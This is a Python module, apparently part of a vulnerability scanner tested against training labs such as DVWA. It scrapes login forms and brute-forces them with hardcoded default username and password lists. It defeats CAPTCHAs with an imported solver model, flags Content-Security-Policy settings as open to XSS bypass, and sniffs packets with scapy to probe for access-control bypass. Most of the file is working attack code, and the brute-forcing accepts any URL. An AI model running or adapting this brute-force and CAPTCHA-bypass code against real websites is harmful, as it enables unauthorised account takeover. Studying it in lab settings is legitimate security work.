import requests
from bs4 import BeautifulSoup
import threading
import time
from scapy.all import *
from src.main.mycaptcha.train import test_one


class formBypass(object):
    def __init__(self, url, config_ini):
        super(formBypass, self).__init__()
        self.url = url
        self.config_ini = config_ini
        self.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4146.4 Safari/537.36'
        self.cookie = 'PHPSESSID=v3d1ancf4v9jvsu3dnu8t45hcg; security=medium' # 'PHPSESSID=v3d1ancf4v9jvsu3dnu8t45hcg; security=low'
        self.example = 'get_user_data.php'
        self.response_packets = []
        self.response_packets.append(self.example)
        self.headers = {
            'Cookie': self.cookie,
        }

        self.path = self.config_ini['main_project']['project_path'] + self.config_ini['bypass']['bypass_py']
        self.output = self.config_ini['main_project']['project_path'] + self.config_ini['bypass']['bypass_log']

    # 用于处理接收到的数据包的回调函数
    def packet_handler(self, packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            raw = packet.getlayer(Raw)
            if raw.load.startswith(b'HTTP/'):
                self.response_packets.append(packet.summary())

    # 发送请求的线程函数
    def send_request(self):
        response = requests.get(self.url, headers=self.headers)

    # 启动数据包嗅探的线程函数
    def start_sniffing(self):
        sniff(prn=self.packet_handler, timeout=10)

    def bypassDetect(self):
        # 表单绕过：暴力破解验证码绕过（on server 验证码有效期较长；on client 前端验证码测试可直接通过发送请求绕过本地检测，服务器端根本不检测，随便写验证码就行）
        url = self.url
        user_agent =self.user_agent
        cookie = self.cookie
        logtext = ""
        warningtext = ""
        userName = ['admin', 'admin0', 'admin1', 'admin2', 'admin123', 'root', 'user', 'pikachu', 'pikachuu',
                    'pikachup', 'kali', 'ubuntu', 'guest', 'supervisor', 'user0', 'system',
                    'manager', 'support', 'staff', 'webmaster', 'technician', 'developer', 'analyst', 'engineer',
                    'tester', 'operator', 'master123',
                    'service', 'backup', 'security', '123456', 'password', 'admin123', 'qwerty', '123456789', '111111',
                    'abc123', '1234567',
                    '123123', 'letmein', 'welcome', '1234', '12345', '12345678', 'passw0rd', '1234567890', 'adminadmin',
                    'password123', '1q2w3e4r']
        passWord = ['password', 'admin123', 'qwerty', '123456', '123456789', '111111', 'abc123', 'pikachu', 'pikachuu',
                    'pikachup', '1234567', '123123', 'letmein', 'welcome',
                    '1234', '12345', '12345678', 'passw0rd', '1234567890', 'adminadmin', 'password123', '1q2w3e4r',
                    'master123', 'admin',
                    'admin0', 'admin1', 'admin2', 'admin123', 'root', 'user', 'kali', 'ubuntu']

        my_response = requests.get(url)
        my_html_content = my_response.text
        my_soup = BeautifulSoup(my_html_content, 'html.parser')
        is_injectable = []
        result_list = []

        form_tags = my_soup.find_all('form')
        select_tags = my_soup.find_all('select')
        input_tags = my_soup.find_all('input')
        p_tags = my_soup.find_all('p')
        textarea = my_soup.find_all('textarea')
        img_tags = my_soup.find_all('img')
        for form_tag in form_tags:
            p_tags = form_tag.find_all('p')
            input_tags = form_tag.find_all('input')
            select_tags = form_tag.find_all('select')
            textarea_tags = form_tag.find_all('textarea')
            img_tags = form_tag.find_all('img')

        method = ''
        flag = 0
        count = 0
        for form in form_tags:
            method = form.get('method')
            for uName in userName:
                for pWord in passWord:
                    print(count)
                    count = count + 1
                    params = {}
                    i = 0
                    for img in img_tags:
                        src = img.get('src')
                        vcode = test_one(src)
                        params['vcode'] = vcode
                    for tag in input_tags:
                        if tag.get('name') == None:
                            print(tag)
                            continue
                        else:
                            argName = tag.get('name')
                        if tag.get('value') != None:
                            argVal = tag.get('value')
                        else:
                            if i == 0:
                                argVal = uName
                            elif i == 1:
                                argVal = pWord
                            elif i == 2:
                                argVal = 'i4kjzk'
                        i = i + 1
                        params[argName] = argVal

                    print(params)
                    logtext = logtext + "\n" + str(params)
                    if method == 'get':
                        my_response = requests.get(url, params=params, headers=self.headers)
                        print("[已发送get请求]")
                        logtext = logtext + "\n" + "[已发送GET请求]"
                    elif method == 'post':
                        my_response = requests.post(url, data=params, headers=self.headers)
                        print("[已发送post请求]")
                        logtext = logtext + "\n" + "[已发送POST请求]"
                    result = my_response.text
                    print(result.find("login success"))
                    if result.find("login success") != -1:
                        flag = 1
                        is_injectable.append(True)
                        result_list.append(my_response.url)
                        print("login success!")
                        warningtext = '暴力破解表单绕过成功，可以进行验证码的表单绕过。（on server 验证码有效期较长；on client 前端验证码测试可直接通过发送请求绕过本地检测，服务器端根本不检测，随便写验证码就行）'
                        logtext = logtext + "\n" + "login success!"
                        break
                    elif result.find("username or password is not exists") != -1:
                        print("用户名密码错误")
                        logtext = logtext + "  " + "用户名密码错误" + "\n"
                    elif result.find("验证码输入错误") != -1:
                        flag = 1
                        print("验证码输入错误")
                        logtext = logtext + "\n" + "验证码输入错误"
                        break
                    else:
                        flag = 1
                        break
                if flag:
                    break

            if 'Content-Security-Policy' in my_response.headers:
                if my_response.headers['Content-Security-Policy'].find("http") != -1:
                    result_list.append(my_response.url)
                    print("检测到CSP白名单！可以绕过进行XSS注入！")
                    logtext = logtext + "\n" + "检测到CSP白名单！可以绕过进行XSS注入！"
                    break
                elif my_response.headers['Content-Security-Policy'].find("unsafe-inline") != -1:
                    result_list.append(my_response.url)
                    print("存在Unsafe-inline，虽受限于csp无法直接引入外部js, 不过当frame-src为self, 或者能引入当前域的资源的时候, 即有一定可能能够引入外部js。")
                    print("存在nonce-source，允许特定的内联脚本块，可以绕过进行XSS注入！")
                    logtext = logtext + "\n" + "存在Unsafe-inline，虽受限于csp无法直接引入外部js, 不过当frame-src为self, 或者能引入当前域的资源的时候, 即有一定可能能够引入外部js。" + "\n" + "存在nonce-source，允许特定的内联脚本块，可以绕过进行XSS注入！"
                    warningtext = "存在Unsafe-inline，虽受限于csp无法直接引入外部js, 不过当frame-src为self, 或者能引入当前域的资源的时候, 即有一定可能能够引入外部js。\n存在nonce-source，允许特定的内联脚本块，可以绕过进行XSS注入！"
                    break
                else:
                    print("无法进行CSP绕过")
                    logtext = logtext + "\n" + "无法进行CSP绕过"

            # 访问授权绕过：发送请求的同时进行多线程抓包，查看是否返回有含明文信息的数据包
            if len(result_list) == 0 and url == "http://127.0.0.1:8080/DVWA/vulnerabilities/authbypass/":
                # 创建并启动线程以发送请求
                send_thread = threading.Thread(target=self.send_request)
                send_thread.start()

                # 创建并启动用于数据包嗅探的线程
                sniff_thread = threading.Thread(target=self.start_sniffing)
                sniff_thread.start()

                # 等待探查线程完成
                sniff_thread.join()

                # 输出响应包名称列表
                print("Response packet list:")
                logtext = logtext + "\n" + "Response packet list:" + "\n"
                for packet_name in self.response_packets:
                    print(packet_name)
                    response1 = requests.get(url=url + packet_name)
                    print(response1.text)
                    if response1.text.find("404") == -1:

                        print("可以进行访问权限绕过获取非法授权明文信息")
                        logtext = logtext + response1.text + "\n" + "可以进行访问权限绕过获取非法授权明文信息" + "\n"
                        warningtext = "捕获明文数据包，可以进行访问权限绕过获取非法授权明文信息，建议对数据包的发送进行权限分类管控而不是在前端进行筛选显示"
                        result_list.append(response1.url)
                        break

            if len(result_list) == 0:
                print("无法绕过，该网页无表单绕过漏洞")
                logtext = logtext + "无法绕过，该网页无表单绕过漏洞"
                warningtext = "无法绕过，该网页无表单绕过漏洞"

        return logtext, warningtext


